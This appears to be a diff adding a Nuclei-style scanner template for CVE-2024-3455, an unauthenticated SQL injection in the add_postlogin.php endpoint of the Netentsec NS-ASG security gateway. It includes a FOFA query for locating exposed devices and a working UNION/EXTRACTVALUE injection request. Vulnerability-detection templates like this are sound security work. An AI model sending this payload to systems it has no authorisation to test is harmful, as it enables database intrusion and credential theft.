@@ -1,0 +1,35 @@
+id: wangkang-NS-add_postlogin_php-sql-CVE-2024-3455
+
+info:
+  name: "网康科技 NS-ASG 应用安全网关 add_postlogin.php SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="网康科技-NS-ASG安全网关"
+    网康科技 NS-ASG 应用安全网关的 add_postlogin.php 接口存在可被利用的SQL注入缺陷。攻击者可通过该漏洞执行恶意SQL语句，导致数据库敏感信息泄露，并可能通过高权限操作实现远程代码执行，进而控制服务器。该漏洞允许未经身份验证的远程攻击者通过构造恶意请求，直接访问数据库内容（包括但不限于管理员凭据和用户隐私数据）。
+
+    参考信息：
+    - CVE编号：CVE-2024-3455
+    - 漏洞日期：2024-03-15
+    - 验证方式：基于HTTP请求特征检测
+    - 参考链接：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3455
+  reference:
+  - https://mp.weixin.qq.com/s/k3_U0LVSHpYD9c1sy6CsAQ
+  tags: 网康科技-NS-ASG
+
+http:
+- raw:
+  - |
+    GET /admin/add_postlogin.php?SingleLoginId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+MD5(123123)),0x7e)) HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a9'
+  - type: status
+    status:
+    - 200
